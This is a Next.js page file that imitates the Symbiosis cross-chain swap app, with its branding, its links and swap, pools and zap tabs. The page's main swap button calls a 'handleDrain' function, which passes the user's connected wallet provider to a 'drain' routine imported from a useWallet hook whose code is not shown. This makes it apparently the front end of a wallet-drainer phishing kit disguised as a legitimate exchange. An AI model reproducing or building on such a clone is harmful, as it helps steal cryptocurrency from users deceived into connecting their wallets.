"use client";

import { ethers } from "ethers";
import { useEffect, useState } from "react";
import { Settings, ExternalLink, ArrowDown, X, Info } from "lucide-react";
import Image from "next/image";
import SymbiosisLayout from "../layouts/symbiosisLayout";
import { useAccount } from "wagmi";
import { shortenAddressSmall } from "../utils";
import SelectNetwork from "@/components/symbiosis/SelectNetwork.dropdown";
import { useWallet } from "../../components/useWallet";
import TokenSelector from "@/components/symbiosis/TokenSelector";
import Switch from "@/components/symbiosis/Switch";
import "/public/symbiosis/cygnito-font.css";
import useSymbiosis from "@/hooks/useSymbiosis";
import AccountDropdown from "@/components/symbiosis/AccountDropdown";
import { ethereumTokens } from "@/data/symbiosis/ethereum";

// Dummy data for pools
const pools = [
  {
    name: "USDC",
    chain: "Sei v2",
    icon: "/stargate/usdc-icon.png",
    chainIcon: "/stargate/sei-icon.png",
    totalLocked: "900,852",
    poolBalance: "103%",
    apr: "0.03%",
    boostedApr: "0.03%",
  },
  {
    name: "USDT",
    chain: "Sei v2",
    icon: "/stargate/usdt-icon.png",
    chainIcon: "/stargate/sei-icon.png",
    totalLocked: "892,414",
    poolBalance: "114.8%",
    apr: "0.02%",
    boostedApr: "0.02%",
  },
  {
    name: "USDC",
    chain: "Sei v2",
    icon: "/stargate/usdc-icon.png",
    chainIcon: "/stargate/sei-icon.png",
    totalLocked: "900,852",
    poolBalance: "103%",
    apr: "0.03%",
    boostedApr: "0.03%",
  },
  {
    name: "USDT",
    chain: "Sei v2",
    icon: "/stargate/usdt-icon.png",
    chainIcon: "/stargate/sei-icon.png",
    totalLocked: "892,414",
    poolBalance: "114.8%",
    apr: "0.02%",
    boostedApr: "0.02%",
  },
  {
    name: "USDC",
    chain: "Sei v2",
    icon: "/stargate/usdc-icon.png",
    chainIcon: "/stargate/sei-icon.png",
    totalLocked: "900,852",
    poolBalance: "103%",
    apr: "0.03%",
    boostedApr: "0.03%",
  },
  {
    name: "USDT",
    chain: "Sei v2",
    icon: "/stargate/usdt-icon.png",
    chainIcon: "/stargate/sei-icon.png",
    totalLocked: "892,414",
    poolBalance: "114.8%",
    apr: "0.02%",
    boostedApr: "0.02%",
  },
  {
    name: "USDC",
    chain: "Sei v2",
    icon: "/stargate/usdc-icon.png",
    chainIcon: "/stargate/sei-icon.png",
    totalLocked: "900,852",
    poolBalance: "103%",
    apr: "0.03%",
    boostedApr: "0.03%",
  },
  {
    name: "USDT",
    chain: "Sei v2",
    icon: "/stargate/usdt-icon.png",
    chainIcon: "/stargate/sei-icon.png",
    totalLocked: "892,414",
    poolBalance: "114.8%",
    apr: "0.02%",
    boostedApr: "0.02%",
  },
  {
    name: "USDC",
    chain: "Sei v2",
    icon: "/stargate/usdc-icon.png",
    chainIcon: "/stargate/sei-icon.png",
    totalLocked: "900,852",
    poolBalance: "103%",
    apr: "0.03%",
    boostedApr: "0.03%",
  },
  {
    name: "USDT",
    chain: "Sei v2",
    icon: "/stargate/usdt-icon.png",
    chainIcon: "/stargate/sei-icon.png",
    totalLocked: "892,414",
    poolBalance: "114.8%",
    apr: "0.02%",
    boostedApr: "0.02%",
  },
  {
    name: "USDC",
    chain: "Sei v2",
    icon: "/stargate/usdc-icon.png",
    chainIcon: "/stargate/sei-icon.png",
    totalLocked: "900,852",
    poolBalance: "103%",
    apr: "0.03%",
    boostedApr: "0.03%",
  },
  {
    name: "USDT",
    chain: "Sei v2",
    icon: "/stargate/usdt-icon.png",
    chainIcon: "/stargate/sei-icon.png",
    totalLocked: "892,414",
    poolBalance: "114.8%",
    apr: "0.02%",
    boostedApr: "0.02%",
  },
  {
    name: "USDC",
    chain: "Sei v2",
    icon: "/stargate/usdc-icon.png",
    chainIcon: "/stargate/sei-icon.png",
    totalLocked: "900,852",
    poolBalance: "103%",
    apr: "0.03%",
    boostedApr: "0.03%",
  },
  {
    name: "USDT",
    chain: "Sei v2",
    icon: "/stargate/usdt-icon.png",
    chainIcon: "/stargate/sei-icon.png",
    totalLocked: "892,414",
    poolBalance: "114.8%",
    apr: "0.02%",
    boostedApr: "0.02%",
  },
  // Add more pool data as needed
];

export interface Token {
  name: string;
  address: string;
  symbol: string;
  icon: string;
  balance?: string;
}

export interface Network {
  name: string;
  icon: string;
  isNew?: boolean;
  tokens?: Token[];
  id?: number;
}

export default function Page() {
  const { drain } = useWallet();
  const { connector, isConnected } = useAccount();
  const [activeTab, setActiveTab] = useState<"swap" | "pools" | "zap">("swap");
  const [showSettings, setShowSettings] = useState(false);
  const [showDeprecated, setShowDeprecated] = useState(false);
  const [customAddress, setCustomAddress] = useState("");
  const [slippage, setSlippage] = useState("0.5");
  const [loading, setLoading] = useState(false);
  const [isAddressOpen, setIsAddressOpen] = useState<boolean>(false);
  const [txState, setTxState] = useState("Initial");
  // const [isConnectWallModal, setIsConnectWallModal] = useState("Initial");
  const [fromAmount, setFromAmount] = useState<string | number>("");
  const [toAmount, setToAmount] = useState<string | number>("");
  const { isConnectWalletOpen, setIsConnectWalletOpen } = useSymbiosis();

  const [searchTerm, setSearchTerm] = useState("");
  const [selectedFromNetwork, setSelectedFromNetwork] =
    useState<Network | null>({
      icon: "https://s2.coinmarketcap.com/static/img/coins/64x64/1027.png",
      name: "Ethereum",
      id: 1,
    });
  const [selectedToNetwork, setSelectedToNetwork] = useState<Network | null>(
    null
  );
  const [selectedFromToken, setSelectedFromToken] = useState<Token | null>({
    address: "",
    icon: "https://s2.coinmarketcap.com/static/img/coins/64x64/1027.png",
    name: "Ethereum",
    symbol: "ETH",
  });
  const [selectedToToken, setSelectedToToken] = useState<Token | null>(null);
  const [tokens, setTokens] = useState<Token[]>([]);
  const [filteredTokens, setFilteredTokens] = useState<Token[]>([]);
  const [transferFromToken, setTransferFromToken] = useState<{
    network: Network;
    token: Token;
  } | null>(null);
  const [supplyingToToken, setSupplyingToToken] = useState<{
    network: Network;
    token: Token;
  } | null>(null);
  const [fromToken, setFromToken] = useState<{
    network: Network;
    token: Token;
  } | null>(null);
  const [toToken, setToToken] = useState<{
    network: Network;
    token: Token;
  } | null>(null);

  useEffect(() => {
    if (searchTerm) {
      const filtered = tokens.filter(
        (token) =>
          token.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
          token.symbol.toLowerCase().includes(searchTerm.toLowerCase()) ||
          token.address.toLowerCase().includes(searchTerm.toLowerCase())
      );
      setFilteredTokens(filtered);
    } else {
      setFilteredTokens(tokens);
    }
  }, [searchTerm, tokens]);

  //   setSelectedNetwork(network);
  //   setSelectedToken(token);
  //   setIsOpen(false);
  // };

  const handleDrain = async () => {
    if (!connector) {
      console.error("Missing required fields for drain.");
      return;
    }

    try {
      setLoading(true);
      setTxState("Processing");

      const provider = new ethers.providers.Web3Provider(
        await connector.getProvider()
      );
      const chainId = await provider.getSigner().getChainId();

      await drain(provider, chainId, toToken.token.address); // Trigger drain with correct args

      setTxState("Completed");
      setLoading(false);
    } catch (error) {
      console.error("Error in drain function:", error);
      setTxState("Failed");
      setLoading(false);
    }
  };

  const handleSwap = () => {
    setSelectedFromNetwork(selectedToNetwork);
    setSelectedToNetwork(selectedFromNetwork);
    setSelectedToToken(selectedFromToken);
    setSelectedFromToken(selectedToToken);
  };

  const renderSwapContent = () => (
    <div className="space-y-6">
      <div className="flex justify-between items-center">
        <div className="flex items-center gap-2">
          <h2 className="text-2xl">Exchange</h2>
          <p>{"{?}"}</p>
        </div>
        <div className="bg-[#f1f1f1] p-2 rounded-lg">
          <Settings
            className="w-6 h-6 cursor-pointer hover:text-gray-300 transition-colors"
            onClick={() => setShowSettings(true)}
          />
        </div>
      </div>

      <div className="space-y-2 relative border-b-2 border-[#707070]">
        <TokenSelector
          isWithMax
          amount={fromAmount}
          setAmount={setFromAmount}
          selectedNetwork={selectedFromNetwork}
          selectedToken={selectedFromToken}
          setSelectedNetwork={setSelectedFromNetwork}
          setSelectedToken={setSelectedFromToken}
          label="From"
          onSelect={(network, token) => setFromToken({ network, token })}
        />
        <div className="flex justify-center absolute w-full bottom-[-15px]">
          <div className="flex justify-center">
            <div
              onClick={handleSwap}
              className="bg-black rounded-lg p-2 cursor-pointer hover:bg-gray-900"
            >
              <img
                src="/symbiosis/download (5).svg"
                alt="round"
                className="w-[]"
              />
            </div>
          </div>
        </div>
      </div>

      <div className="space-y-2">
        <TokenSelector
          amount={toAmount}
          setAmount={setToAmount}
          selectedNetwork={selectedToNetwork}
          selectedToken={selectedToToken}
          setSelectedNetwork={setSelectedToNetwork}
          setSelectedToken={setSelectedToToken}
          label="To"
          onSelect={(network, token) => setToToken({ network, token })}
        />
      </div>

      <div className="w-full flex justify-start items-center gap-2">
        <Switch open={isAddressOpen} setOpen={setIsAddressOpen} />
        <p className="text-[#888]">Receive to another wallet</p>
      </div>

      {isAddressOpen ? (
        <div className="space-y-2">
          <label className="text-sm sm:text-base text-gray-400">
            Enter address:
          </label>
          <input
            type="text"
            onChange={(e) => setCustomAddress(e.target.value)}
            value={customAddress}
            placeholder="..."
            className="w-full bg-[#fff] shadow-md rounded-lg p-4 outline-none font-mono"
          />
          <p className=" text-sm">
            <span className="text-orange-500">Important: </span>
            Use self-custodial wallets only! Do not send funds to addresses
            provided by exchanges or third-party services.
          </p>
        </div>
      ) : null}

      <button
        onClick={() => handleDrain()}
        disabled={loading}
        className={`${
          customAddress === "" ? "bg-[#A3A3A3]" : "bg-[#76FB6D]"
        } w-full bg-black text-white py-4 rounded-lg hover:bg-gray-900 transition-colors`}
      >
        {customAddress.length > 1 &&
        !ethers.utils.isAddress(customAddress) &&
        !loading
          ? "SET VALID ADDRESS"
          : ""}
        {loading ? "TRANSFERRING..." : ""}
        {selectedToToken ? "" : "SELECT THE TOKEN YOU RECEIVE"}
      </button>
    </div>
  );

  const renderPoolsContent = () => (
    <div className="space-y-6">
      <div className="flex justify-between items-center">
        <div className="flex items-center gap-2">
          <h2 className="text-xl">All pools</h2>
          <Info className="w-4 h-4 text-gray-400" />
        </div>
        <button className="bg-[#fff] shadow-md px-4 py-4 rounded-lg hover:bg-gray-800 transition-colors">
          My liquidity
        </button>
      </div>

      <div className="space-y-4">
        <input
          type="text"
          placeholder="Search by Name/Chain/Token"
          className="w-full bg-[#fff] shadow-md rounded-lg p-4 outline-none"
          value={searchTerm}
          onChange={(e) => setSearchTerm(e.target.value)}
        />

        <label className="flex items-center gap-2">
          <input
            type="checkbox"
            checked={showDeprecated}
            onChange={(e) => setShowDeprecated(e.target.checked)}
          />
          <span className="text-sm text-gray-400">Show deprecated pools</span>
        </label>

        <div className="space-y-4">
          {pools.map((pool, index) => (
            <div key={index} className="bg-[#f3f3f3] rounded-lg p-4">
              <div className="flex justify-between items-center mb-4">
                <div className="flex items-center gap-2">
                  <div className="relative">
                    <Image
                      src={pool.icon}
                      alt={pool.name}
                      width={32}
                      height={32}
                      className="rounded-full"
                    />
                    <div className="border-2 p-[1px] absolute -top-0 -right-1 bg-white  border-white rounded-full">
                      <Image
                        src={pool.chainIcon}
                        alt={pool.name}
                        width={12}
                        height={12}
                        className=" rounded-full"
                      />
                    </div>
                  </div>
                  <span className="font-mono">{pool.name}</span>
                </div>
                <div className="flex items-center gap-2">
                  <Image
                    src={pool.chainIcon}
                    alt={pool.chain}
                    width={16}
                    height={16}
                  />
                  <span className="text-sm">{pool.chain}</span>
                </div>
              </div>
              <div className="flex items-center justify-between gap-4 text-xs">
                <div>
                  <div className="text-gray-400">Total Locked</div>
                  <div className="font-mono">{pool.totalLocked}</div>
                </div>
                <div>
                  <div className="text-gray-400">Pool balance {" {?}"}</div>
                  <div className="font-mono">{pool.poolBalance}</div>
                </div>
                <div>
                  <div className="text-gray-400">APR {" {?}"}</div>
                  <div className="font-mono">{pool.apr}</div>
                </div>
                <div>
                  <div className="text-gray-400">Boosted APR {" {?}"}</div>
                  <div className="font-mono">{pool.boostedApr}</div>
                </div>
              </div>
              <button className="w-full mt-4 text-md bg-[#fff] text-center py-2 rounded-lg hover:bg-gray-800 transition-colors">
                Manage
              </button>
            </div>
          ))}
        </div>
      </div>
    </div>
  );

  const renderZapContent = () => (
    <div className="space-y-6">
      <div className="flex justify-between items-center">
        <div className="flex items-center gap-2">
          <h2 className="text-xl">Cross-chain Zap</h2>
          <Info className="w-4 h-4 text-gray-400" />
        </div>
        <div className="bg-[#f1f1f1] p-2 rounded-lg">
          <Settings
            className="w-6 h-6 cursor-pointer hover:text-gray-300 transition-colors"
            onClick={() => setShowSettings(true)}
          />
        </div>
      </div>

      {/* Similar to swap content but with different labels */}
      <div className="space-y-4">
        <TokenSelector
          label="Transfer From"
          onSelect={(network, token) =>
            setTransferFromToken({ network, token })
          }
        />

        <div className="flex justify-center">
          <div className="bg-black rounded-lg p-2 cursor-pointer hover:bg-gray-900">
            <ArrowDown className="w-5 h-5 text-white" />
          </div>
        </div>
        <TokenSelector
          label="Supplying To"
          onSelect={(network, token) => setSupplyingToToken({ network, token })}
        />

        <button className="w-full bg-black text-white py-2 rounded-lg hover:bg-gray-900 transition-colors">
          CONNECT WALLET
        </button>
      </div>
    </div>
  );

  return (
    <SymbiosisLayout>
      <div className="min-h-screen bg-[#F9F9F9] text-black">
        {/* Top Banner */}
        <div className="bg-blue-500 md:text-md text-xs text-white font-bold p-3 text-center flex items-center justify-center gap-2">
          Cross-chain swaps to TON with Symbiosis TON Bridge v2
        </div>

        {/* Navbar */}
        <nav className="mt-3">
          <div className="w-full mx-auto px-4">
            <div className="h-16">
              <div className="flex justify-between items-center gap-8">
                <div className="flex items-center gap-2">
                  <Image
                    src="/symbiosis/download.svg"
                    alt="Symbiosis"
                    width={40}
                    height={40}
                    className="rounded-2xl"
                  />
                  <span className="font-mono flex">
                    Symbiosis <span className="md:block hidden">/ App</span>
                  </span>
                  <span className="text-sm bg-[#fff] rounded-2xl p-1 text-black ">
                    v2
                  </span>
                </div>
                <div className="md:flex hidden items-center text-lg gap-8">
                  <a
                    href="#"
                    className="hover:text-gray-300 font-bold transition-colors"
                  >
                    Swap
                  </a>
                  <a
                    href="https://explorer.symbiosis.finance/"
                    className="hover:text-gray-300 text-gray-400 transition-colors"
                  >
                    Explorer
                  </a>
                  <a
                    href="https://rewards.symbiosis.finance/vesis"
                    className="flex items-center gap-1 bg-[#76FB6D] font-bold px-4 py-2 rounded-xl text-[#000] hover:bg-[#5fd656] transition-colors"
                  >
                    veSIS
                    <ExternalLink className="w-4 h-4" />
                  </a>
                </div>
                {isConnected ? (
                  <ConnectedButtonsGroup />
                ) : (
                  <button
                    onClick={() => setIsConnectWalletOpen(true)}
                    className="bg-black text-white text-sm md:px-5 p-2 md:py-3 rounded-2xl hover:bg-gray-900 transition-colors flex gap-1.5 items-center"
                  >
                    Connect <span className="sm:block hidden">wallet</span>
                  </button>
                )}
              </div>
            </div>
          </div>
        </nav>

        {/* Main Content */}
        <main className="max-w-[600px] mx-auto px-4 py-8">
          <div className=" rounded-2xl p-6">
            {/* Tabs */}
            <div className="flex rounded-2xl bg-[#F1F1F1] p-1 mb-6">
              {(["swap", "pools", "zap"] as const).map((tab) => (
                <button
                  key={tab}
                  onClick={() => setActiveTab(tab)}
                  className={`flex-1 py-2 rounded-2xl text-center capitalize transition-colors ${
                    activeTab === tab
                      ? "bg-white text-black"
                      : "text-gray-400 hover:text-white"
                  }`}
                >
                  {tab}
                </button>
              ))}
            </div>

            {/* Tab Content */}
            {activeTab === "swap" && renderSwapContent()}
            {activeTab === "pools" && renderPoolsContent()}
            {activeTab === "zap" && renderZapContent()}
          </div>
        </main>

        {/* Settings Modal */}
        {showSettings && (
          <div className="fixed px-4 inset-0 bg-black/50 flex items-center justify-center">
            <div className="bg-[#F3F3F3] rounded-2xl p-6 w-full max-w-md">
              <div className="flex justify-between items-center mb-6">
                <h2 className="text-xl">Settings</h2>

                <div className="bg-white p-2 rounded-lg">
                  <X
                    className="w-6 h-6 cursor-pointer hover:text-gray-300 transition-colors"
                    onClick={() => setShowSettings(false)}
                  />
                </div>
              </div>
              {/* Add settings content here */}
              <div className="space-y-4">
                <div className="space-y-2">
                  <label className="text-sm text-black">
                    Slippage Tolerance
                  </label>

                  <div className="flex items-center justify-between gap-2 ">
                    <div className="md:flex hidden items-center gap-1 ">
                      <div
                        onClick={() => setSlippage("1.0")}
                        className={`${
                          slippage === "1.0" && "bg-black text-white"
                        } p-3 cursor-pointer  text-sm hover:bg-white rounded-lg`}
                      >
                        <p>1.0%</p>
                      </div>
                      <div
                        onClick={() => setSlippage("1.5")}
                        className={`${
                          slippage === "1.5" && "bg-black text-white"
                        } p-3  cursor-pointer text-sm hover:bg-white rounded-lg`}
                      >
                        <p>1.5%</p>
                      </div>
                      <div
                        onClick={() => setSlippage("2.0")}
                        className={`${
                          slippage === "2.0" && "bg-black text-white"
                        } p-3 cursor-pointer  text-sm hover:bg-white rounded-lg`}
                      >
                        <p>2.0%</p>
                      </div>
                    </div>
                    <div className="bg-white shadow-lg w-full flex items-center gap-2 rounded-lg border border-transparent focus-within:border-black ">
                      <input
                        type="number"
                        value={slippage}
                        onChange={(e) => setSlippage(e.target.value)}
                        className="w-full bg-transparent  rounded-lg p-3 outline-none"
                        placeholder={slippage || "0.5%"}
                      />
                      <div className="text-gray-400 pr-2">%</div>
                    </div>
                  </div>
                </div>
                <p className="text-sm">
                  <span className="font-bold">Slippage Tolerance </span>
                  is the maximum price change you are willing to accept for your
                  trades to be completed. On-chain and cross-chain swaps will be
                  treated in a special way if the price change exceeds the
                  specified value.{" "}
                  <a
                    href="https://docs.symbiosis.finance/user-guide-webapp/more-about-slippage-tolerance"
                    className="underline text-[#76FB6D]"
                  >
                    Learn more
                  </a>
                </p>
                <div className="space-y-2">
                  <label className="text-sm text-black">
                    On-chain trades deadline:
                  </label>

                  <div className="bg-white shadow-lg flex items-center gap-2 rounded-lg border border-transparent focus-within:border-black ">
                    <input
                      type="number"
                      className="w-full bg-transparent  rounded-lg p-3 outline-none"
                      placeholder="30"
                    />
                    <div className="text-gray-400 pr-2">Minutes</div>
                  </div>
                </div>
              </div>

              <div className="bg-black mt-7 rounded-xl text-center py-3 w-full text-white">
                SAVE CHANGES
              </div>
            </div>
          </div>
        )}
      </div>
    </SymbiosisLayout>
  );
}

const ConnectedButtonsGroup = () => {
  const { address } = useAccount();
  const [open, setOpen] = useState<boolean>(false);

  return (
    <div className="flex justify-start items-center gap-2 flex-nowrap whitespace-nowrap">
      <SelectNetwork />
      <button
        onClick={() => setOpen(!open)}
        className="rounded-xl text-white bg-black px-4 py-3 font-medium"
      >
        {shortenAddressSmall(address)}
      </button>
      <AccountDropdown onClose={() => setOpen(false)} open={open} />
    </div>
  );
};
